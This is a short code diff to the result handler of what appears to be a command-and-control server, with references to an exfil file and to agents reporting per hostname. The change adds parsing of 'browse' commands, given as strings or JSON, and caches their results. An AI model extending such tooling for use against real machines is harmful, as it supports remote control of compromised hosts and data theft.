@@ -265,13 +265,30 @@ def result():
         except Exception as ex:
             print(f"[!] Failed to process exfil file: {ex}")
     
-    if command.startswith("browse "):
-        try:
-            browse_json = json.loads(result)
-            browse_results[hostname] = browse_json  # Cache for quick access
-        except Exception:
-            pass  # If result is not valid JSON, skip caching
-   
+    try:
+        browse_cmd = False
+        if isinstance(command, str):
+            if command.startswith("browse "):
+                browse_cmd = True
+            else:
+            # Try to parse JSON
+                try:
+                    cmd_obj = json.loads(command)
+                    if isinstance(cmd_obj, dict) and cmd_obj.get("action") == "browse":
+                        browse_cmd = True
+                except Exception:
+                    pass
+        if browse_cmd:
+        # result is JSON string (from agent)
+            try:
+                browse_json = json.loads(result)
+                browse_results[hostname] = browse_json  # Cache for quick access
+                print(f"[DEBUG] Cached browse result for {hostname}: {browse_json}")
+            except Exception as ex:
+                print(f"[!] Failed to parse browse result: {ex}")
+    except Exception as ex:
+        print(f"[!] Error in browse result handler: {ex}")
+
     # Store result in database
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
